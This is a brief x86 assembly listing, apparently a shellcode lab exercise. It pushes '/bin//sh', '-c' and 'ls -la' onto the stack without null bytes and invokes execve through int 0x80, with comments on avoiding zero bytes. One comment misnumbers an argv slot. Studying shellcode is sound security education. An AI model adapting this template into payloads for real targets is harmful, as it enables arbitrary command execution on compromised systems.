section .text
  global _start
    _start:
      ; Store the argument string on stack
      xor  eax, eax 
      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address
	
	xor edx, edx	 ; set edx to 0
	mov dx, "-c"	 ; "-c" is 2 bytes, so we must only set these 2 bytes of register edx to avoid 0 in machine code
	push edx	 ; push by default is always 4 bytes
	mov edx, esp	 ; store the string "-c" back into edx
	
	; simillar to above
	xor ecx, ecx	
	mov cx, "la"
	push ecx
	push "ls -"
	mov ecx, esp

      ; Construct the argument array argv[]
      push eax          ; argv[4] = 0
      	push ecx	 ; argv[2] points "ls -la"
	push edx      	 ; argv[1] points "-c"
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]
   
      ; For environment variable 
      xor  edx, edx     ; No env variables 

      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
